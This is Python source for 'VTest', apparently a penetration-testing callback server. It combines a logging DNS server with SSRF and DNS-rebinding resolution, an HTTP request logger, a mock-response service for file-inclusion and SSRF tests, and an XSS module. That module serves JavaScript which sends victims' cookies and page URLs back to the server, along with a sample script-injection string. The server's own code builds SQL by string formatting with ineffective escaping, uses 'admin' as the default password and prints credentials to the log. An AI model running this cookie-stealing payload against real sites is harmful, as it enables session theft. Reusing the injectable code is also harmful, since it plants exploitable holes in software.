# coding:utf-8
from flask import Flask, jsonify, request, redirect, url_for
from flask_httpauth import HTTPBasicAuth
from urllib import quote
import SocketServer
import struct
import socket as socketlib
import re
import thread
from datetime import datetime
import json
import sqlite3
import socket
import sys
import getopt

app = Flask(__name__)
auth = HTTPBasicAuth()
ROOT_DOMAIN = ''
DB = None
REBIND_CACHE = []
LOCAL_IP = ''
PASSWORD = 'admin'

HTML_TMEPLATE = '''
<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="utf-8">
    <title>VTest - 漏洞测试辅助系统</title>
    <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css">
    <script src="https://code.jquery.com/jquery-3.3.1.min.js" integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8=" crossorigin="anonymous"></script>
    <script src="https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js"></script>
    <script src="https://unpkg.com/bootstrap-table@1.14.2/dist/bootstrap-table.min.js"></script>
    <link rel="stylesheet" href="https://unpkg.com/bootstrap-table@1.14.2/dist/bootstrap-table.min.css">
    <script>
        $(document).ready(function() {
            $('#dnslog_table').bootstrapTable({
                url: '/dns',
                pagination: true,
                sidePagination: 'server',
                search: true,
                escape: true,
                columns: [{
                    field: 'domain',
                    title: 'Query'
                }, {
                    field: 'ip',
                    title: 'Result IP'
                }, {
                    field: 'insert_time',
                    title: 'Query Time'
                }]
            });
            $('#httplog_table').bootstrapTable({
                url: '/httplog',
                pagination: true,
                sidePagination: 'server',
                search: true,
                escape: true,
                columns: [{
                    field: 'url',
                    title: 'URL'
                }, {
                    field: 'headers',
                    title: 'Headers'
                }, {
                    field: 'data',
                    title: 'POST Data'
                }, {
                    field: 'ip',
                    title: 'Source IP'
                }, {
                    field: 'insert_time',
                    title: 'Request Time'
                }]
            });
            $('#mock_table').bootstrapTable({
                url: '/mock',
                pagination: true,
                sidePagination: 'server',
                escape: true,
                columns: [{
                    field: 'url',
                    title: 'Mock URL'
                }, {
                    field: 'code',
                    title: 'Code'
                }, {
                    field: 'headers',
                    title: 'Headers'
                }, {
                    field: 'body',
                    title: 'Body'
                }, {
                    field: 'insert_time',
                    title: 'Request Time'
                }]
            });
            $('#xss_table').bootstrapTable({
                url: '/xss',
                pagination: true,
                sidePagination: 'server',
                escape: true,
                columns: [{
                    field: 'name',
                    title: 'Name'
                }, {
                    field: 'location',
                    title: 'Source Location'
                }, {
                    field: 'cookie',
                    title: 'Cookies'
                }, {
                    field: 'other',
                    title: 'Other Info'
                }, {
                    field: 'insert_time',
                    title: 'Receive Time'
                }]
            });
        });
    </script>
</head>

<body>
    <div class="container">
        <ul id="myTab" class="nav nav-tabs">
            <li class="active"><a href="#mock" data-toggle="tab">Mock</a></li>
            <li><a href="#dnslog" data-toggle="tab">DNS Tools</a></li>
            <li><a href="#httplog" data-toggle="tab">HTTP Log</a></li>
            <li><a href="#xss" data-toggle="tab">XSS</a></li>
        </ul>
        <div id="myTabContent" class="tab-content">
            <div class="tab-pane fade in active" id="mock">
                <div class="panel panel-default">
                    <div class="panel-heading">
                        <p><b>使用帮助：</b><br> 自定义http请求返回结果，方便漏洞测试
                            <br> 例如：
                            <br> 1.定义返回内容为php代码，用于测试php远程文件包含漏洞
                            <br> 2.定义301/302跳转，测试SSRF漏洞
                        </p>
                        <button type="button" class="btn btn-default" data-toggle="modal" data-target="#mock_add">新增</button>
                    </div>
                    <table id="mock_table" style="word-break:break-all; word-wrap:break-all;">
                    </table>
                </div>
            </div>
            <div class="tab-pane fade" id="dnslog">
                <div class="panel panel-default">
                    <div class="panel-heading">
                        <p><b>使用帮助：</b><br> 可用于辅助判断无法回显漏洞以及特殊场景下的使用
                            <br> 例如：
                            <br> 请确保{domain}域名NS指向部署运行此脚本的IP上
                            <br> 1.<code>vultest.{domain}</code>，任意多级域名解析均会记录显示，可用于各种无回显漏洞的判断、漏洞分析、数据回传
                            <br> 2.<code>10.100.11.22.{domain}</code> 解析结果为 10.100.11.22，用于特殊的漏洞场景（例如某个ssrf限制了域名且判断存在问题，用这个可以方便的遍历内网资源）
                            <br> 3.<code>66.123.11.11.10.100.11.22.{domain}</code> 首次解析为66.123.11.11，第二次则解析为10.100.11.22，可用于DNS rebinding的漏洞测试
                        </p>
                    </div>
                    <table id="dnslog_table" style="word-break:break-all; word-wrap:break-all;">
                    </table>
                </div>
            </div>
            <div class="tab-pane fade" id="httplog">
                <div class="panel panel-default">
                    <div class="panel-heading">
                        <p><b>使用帮助：</b><br> 可用于辅助判断无法回显漏洞以及特殊场景下的使用
                            <br> 例如：
                            <br> 1.<code>http://httplog.{domain}/httplog/test</code>，httplog和mock路由下的任意HTTP请求均会记录详细的请求包，可用于各种无回显漏洞的判断、漏洞分析、信息收集、数据回传
                            <br>
                        </p>
                    </div>
                    <table id="httplog_table" style="word-break:break-all; word-wrap:break-all;">
                    </table>
                </div>
            </div>
            <div class="tab-pane fade" id="xss">
                <div class="panel panel-default">
                    <div class="panel-heading">
                        <p><b>使用帮助：</b><br> 用于测试储存型xss漏洞
                            <br> JS地址：http://x.{domain}/xss/test/js test可自定义，用于项目区分<br> 例如：<code>'"/>&lt;script src=http://x.{domain}/xss/test/js&gt;&lt;/script&gt;</code>
                        </p>
                    </div>
                    <table id="xss_table" style="word-break:break-all; word-wrap:break-all;">
                    </table>
                </div>
            </div>
        </div>
    </div>
</body>
<div class="modal fade" id="mock_add" tabindex="-1" role="dialog" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <button type="button" class="close" data-dismiss="modal" aria-hidden="true">
                        &times;
                    </button>
                <h4 class="modal-title">
                    新增
                </h4>
            </div>
            <form role="form" action="/mock" method="POST">
                <div class="modal-body">
                    <div class="form-group">
                        <input type="hidden" name="action" value="add">
                        <label>Name</label>
                        <input type="text" class="form-control" name="name" placeholder="test">
                        <label>Code</label>
                        <input type="text" class="form-control" name="code" value="200">
                        <label>Headers</label>
                        <textarea name="headers" class="form-control" rows="4" placeholder="Server: xxxx&#13;&#10;Location: http://test.com"></textarea>
                        <label>Body</label>
                        <textarea name="body" class="form-control" rows="4" placeholder="phpinfo();"></textarea>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-default" data-dismiss="modal">关闭</button>
                    <button type="submit" class="btn btn-primary">新增</button>
                </div>
            </form>
        </div>
        <!-- /.modal-content -->
    </div>
    <!-- /.modal -->
</div>

</html>
'''

@auth.verify_password
def verify_pw(username, password):
    print(username, password)
    if username == 'admin' and password == PASSWORD:
        return 'true'
    return None


class sqlite:
    def __init__(self):
        self.conn = sqlite3.connect('vtest.db', check_same_thread=False)
        self._init_db()

    def _init_db(self):
        cursor = self.conn.cursor()
        cursor.execute('''
        CREATE TABLE IF NOT EXISTS xss(
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name varchar(30) NOT NULL,
            source_ip varchar(20) NOT NULL,
            location text,
            toplocation text,
            opener text,
            cookie text,
            insert_time datetime
        )
        ''')
        cursor.execute('''
        CREATE TABLE IF NOT EXISTS mock(
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name varchar(254) NOT NULL,
            code integer,
            headers text,
            body text,
            insert_time datetime
        )
        ''')
        cursor.execute('''
        CREATE TABLE IF NOT EXISTS dns_log(
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name text,
            domain text,
            ip text,
            insert_time datetime
        )
        ''')
        cursor.execute('''
        CREATE TABLE IF NOT EXISTS http_log(
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            url text,
            headers text,
            data text,
            ip text,
            insert_time datetime
        )
        ''')
        cursor.close()
        self.conn.commit()

    def exec_sql(self, sql):
        # print sql
        result = []
        cursor = self.conn.cursor()
        rows = cursor.execute(sql)
        for v in rows:
            result.append(v)
        cursor.close()
        self.conn.commit()
        return result


class DNSFrame:
    def __init__(self, data):
        (self.id, self.flags, self.quests, self.answers, self.author,
         self.addition) = struct.unpack('>HHHHHH', data[0:12])
        self.query_type, self.query_name, self.query_bytes = self._get_query(
            data[12:])
        self.answer_bytes = None

    def _get_query(self, data):
        i = 1
        name = ''
        while True:
            d = ord(data[i])
            if d == 0:
                break
            if d < 32:
                name = name + '.'
            else:
                name = name + chr(d)
            i = i + 1
        query_bytes = data[0:i + 1]
        (_type, classify) = struct.unpack('>HH', data[i + 1:i + 5])
        query_bytes += struct.pack('>HH', _type, classify)
        return _type, name, query_bytes

    def _get_answer_getbytes(self, ip):
        answer_bytes = struct.pack('>HHHLH', 49164, 1, 1, 190, 4)
        s = ip.split('.')
        answer_bytes = answer_bytes + struct.pack('BBBB', int(s[0]), int(s[1]),
                                                  int(s[2]), int(s[3]))
        return answer_bytes

    def get_query_domain(self):
        return self.query_name

    def setip(self, ip):
        self.answer_bytes = self._get_answer_getbytes(ip)

    def getbytes(self):
        res = struct.pack('>HHHHHH', self.id, 33152, self.quests, 1,
                          self.author, self.addition)
        res += self.query_bytes + self.answer_bytes
        return res


class DNSUDPHandler(SocketServer.BaseRequestHandler):
    def handle(self):
        data = self.request[0].strip()
        dns = DNSFrame(data)
        socket_u = self.request[1]
        a_map = DNSServer.A_map
        if (dns.query_type == 1):
            domain = dns.get_query_domain()
            ip = '127.0.0.1'
            if domain in a_map:
                # 自定义的dns记录，保留着
                ip = a_map[domain]
            elif domain.count('.') == 5:
                # 10.11.11.11.test.com 即解析为 10.11.11.11
                ip = domain.replace('.' + ROOT_DOMAIN, '')
            elif domain.count('.') == 9:
                # 114.114.114.114.10.11.11.11.test.com 循环解析，例如第一次解析结果为114.114.114.114，第二次解析结果为10.11.11.11
                tmp = domain.replace('.' + ROOT_DOMAIN, '').split('.')
                ip_1 = '.'.join(tmp[0:4])
                ip_2 = '.'.join(tmp[4:])
                if tmp in REBIND_CACHE:
                    ip = ip_2
                    REBIND_CACHE.remove(tmp)
                else:
                    REBIND_CACHE.append(tmp)
                    ip = ip_1
            if ROOT_DOMAIN in domain:
                name = domain.replace('.' + ROOT_DOMAIN, '')
                sql = "INSERT INTO dns_log (name,domain,ip,insert_time) \
                    VALUES('{name}', '{domain}', '{ip}', datetime(CURRENT_TIMESTAMP,'localtime'))".format(name=name, domain=domain, ip=ip)
                DB.exec_sql(sql)
            dns.setip(ip)
            print '%s: %s-->%s' % (self.client_address[0], name, ip)
            socket_u.sendto(dns.getbytes(), self.client_address)
        else:
            socket_u.sendto(data, self.client_address)


class DNSServer:
    def __init__(self):
        DNSServer.A_map = {}

    def add_record(self, name, ip):
        DNSServer.A_map[name] = ip

    def start(self):
        server = SocketServer.UDPServer(("0.0.0.0", 53), DNSUDPHandler)
        server.serve_forever()


@app.route('/')
@auth.login_required
def index():
    return HTML_TMEPLATE.replace('{domain}', ROOT_DOMAIN), 200


@app.route('/dns')
@auth.login_required
def dns_list():
    result = []
    total = 0
    args = request.values
    offset = int(args.get('offset', 0))
    limit = int(args.get('limit', 10))
    sql = "SELECT domain,ip,insert_time FROM dns_log order by id desc limit {skip},{limit}".format(
        skip=offset, limit=limit)
    rows = DB.exec_sql(sql)
    for v in rows:
        result.append({"domain": v[0], "ip": v[1], "insert_time": v[2]})
    sql = "SELECT COUNT(*) FROM dns_log"
    rows = DB.exec_sql(sql)
    total = rows[0][0]
    return jsonify({'total': int(total), 'rows': result})


@app.route('/httplog/<str>', methods=['GET', 'POST', 'PUT'])
def http_log(str):
    print(request.url, request.data, request.remote_addr, dict(request.headers))
    data = {
        'url': request.url,
        'headers': json.dumps(dict(request.headers)),
        'data': request.data,
        'ip': request.remote_addr
    }
    for k in data:
        data[k] = data[k].replace("'", "\'")
    sql = "INSERT INTO http_log (url,headers,data,ip,insert_time) \
            VALUES('{url}', '{headers}', '{data}', '{ip}', datetime(CURRENT_TIMESTAMP,'localtime'))".format(**data)
    DB.exec_sql(sql)
    return 'success'


@app.route('/httplog')
@auth.login_required
def http_log_list():
    result = []
    total = 0
    args = request.values
    offset = int(args.get('offset', 0))
    limit = int(args.get('limit', 10))
    sql = "SELECT url,headers,data,ip,insert_time FROM http_log order by id desc limit {skip},{limit}".format(
        skip=offset, limit=limit)
    rows = DB.exec_sql(sql)
    for v in rows:
        result.append({'url': v[0], 'headers': v[1],
                       'data': v[2], 'ip': v[3], 'insert_time': v[4]})
    sql = "SELECT COUNT(*) FROM http_log"
    rows = DB.exec_sql(sql)
    total = rows[0][0]
    return jsonify({'total': int(total), 'rows': result})


@app.route('/mock', methods=['GET', 'POST'])
@auth.login_required
def mock_list():
    if request.method == 'GET':
        result = []
        total = 0
        args = request.values
        offset = int(args.get('offset', 0))
        limit = int(args.get('limit', 10))
        sql = "SELECT name,code,headers,body,insert_time FROM mock order by id desc limit {skip},{limit}".format(
            skip=offset, limit=limit)
        rows = DB.exec_sql(sql)
        for v in rows:
            result.append({'url': 'http://mock.{domain}/mock/{name}'.format(domain=ROOT_DOMAIN,
                                                                            name=v[0]), 'code': v[1], 'headers': v[2], 'body': v[3], 'insert_time': v[4]})
        sql = "SELECT COUNT(*) FROM mock"
        rows = DB.exec_sql(sql)
        total = rows[0][0]
        return jsonify({'total': int(total), 'rows': result})
    elif request.method == 'POST':
        # print('POST', request.form)
        args = request.form
        headers = {}
        headers_str = args.get('headers', '')
        if headers_str:
            for h in headers_str.split('\n'):
                k, v = h.split(':', 1)
                headers[k.strip()] = v.strip()
        data = {
            'name': args.get('name', 'test').replace("'", "\'"),
            'code': int(args.get('code', 200)),
            'headers': json.dumps(headers),
            'body': args.get('body', '').replace("'", "\'")
        }
        sql = "INSERT INTO mock (name,code,headers,body,insert_time) \
            VALUES('{name}', {code}, '{headers}', '{body}', datetime(CURRENT_TIMESTAMP,'localtime'))".format(**data)
        DB.exec_sql(sql)
        return redirect(url_for('index'))


@app.route('/mock/<name>')
def mock(name):
    print('GET', name)
    data = {
        'url': request.url,
        'headers': json.dumps(dict(request.headers)),
        'data': request.data,
        'ip': request.remote_addr
    }
    for k in data:
        data[k] = data[k].replace("'", "\'")
    sql1 = "INSERT INTO http_log (url,headers,data,ip,insert_time) \
        VALUES('{url}', '{headers}', '{data}', '{ip}', datetime(CURRENT_TIMESTAMP,'localtime'))".format(**data)
    DB.exec_sql(sql1)
    sql = "SELECT code,headers,body FROM mock where name = '{name}'".format(
        name=name.replace("'", ''))
    rows = DB.exec_sql(sql)
    if len(rows) >= 1:
        body = rows[0][2]
        headers = json.loads(rows[0][1])
        return body, int(rows[0][0]), headers
    return 'null'


@app.route('/xss/<name>/<action>')
def xss(name, action):
    callback_url = request.host_url + 'xss/' + quote(name) + '/save?l='
    js_body = "(function(){(new Image()).src='" + callback_url + "'+escape((function(){try{return document.location.href}catch(e){return ''}})())+'&t='+escape((function(){try{return top.location.href}catch(e){return ''}})())+'&c='+escape((function(){try{return document.cookie}catch(e){return ''}})())+'&o='+escape((function(){try{return (window.opener && window.opener.location.href)?window.opener.location.href:''}catch(e){return ''}})());})();"
    if action == 'js':
        return js_body
    elif action == 'save':
        args = request.values
        data = {
            'name': name,
            'location': args.get('l', ''),
            'toplocation': args.get('t', ''),
            'opener': args.get('o', ''),
            'cookie': args.get('c', ''),
            'source_ip': request.remote_addr
        }
        for k in data:
            data[k] = data[k].replace("'", "\'")
        sql = "INSERT INTO xss (name,location,toplocation,opener,cookie,source_ip,insert_time) \
            VALUES('{name}', '{location}', '{toplocation}','{opener}' ,'{cookie}', '{source_ip}', datetime(CURRENT_TIMESTAMP,'localtime'))".format(**data)
        DB.exec_sql(sql)
        return 'success'


@app.route('/xss')
@auth.login_required
def xss_list():
    result = []
    total = 0
    args = request.values
    offset = int(args.get('offset', 0))
    limit = int(args.get('limit', 10))
    sql = "SELECT name,location,toplocation,opener,cookie,source_ip,insert_time FROM xss order by id desc limit {skip},{limit}".format(
        skip=offset, limit=limit)
    rows = DB.exec_sql(sql)
    for v in rows:
        result.append({'name': v[0], 'location': v[1], 'other': v[2] + '\n' +
                       v[3], 'cookie': v[4], 'source_ip': v[5], 'insert_time': v[6]})
    sql = "SELECT COUNT(*) FROM xss"
    rows = DB.exec_sql(sql)
    total = rows[0][0]
    return jsonify({'total': int(total), 'rows': result})


def dns():
    d = DNSServer()
    d.add_record('httplog', LOCAL_IP)
    d.add_record('x', LOCAL_IP)
    d.add_record('mock', LOCAL_IP)
    d.start()


if __name__ == "__main__":
    msg = '''
Usage: python vtest.py -d yourdomain.com [-h 123.123.123.123] [-p password]
    '''
    if len(sys.argv) < 2:
        print msg
        exit()
    options, args = getopt.getopt(sys.argv[1:], "d:h:p:")
    for opt, arg in options:
        if opt == '-d':
            ROOT_DOMAIN = arg
        elif opt == '-h':
            LOCAL_IP = arg
        elif opt == '-p':
            PASSWORD = arg
    if LOCAL_IP == '':
        csock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        csock.connect(('8.8.8.8', 80))
        (addr, _) = csock.getsockname()
        csock.close()
        LOCAL_IP = addr
    DB = sqlite()
    thread.start_new_thread(dns, ())
    app.run('0.0.0.0', 80)
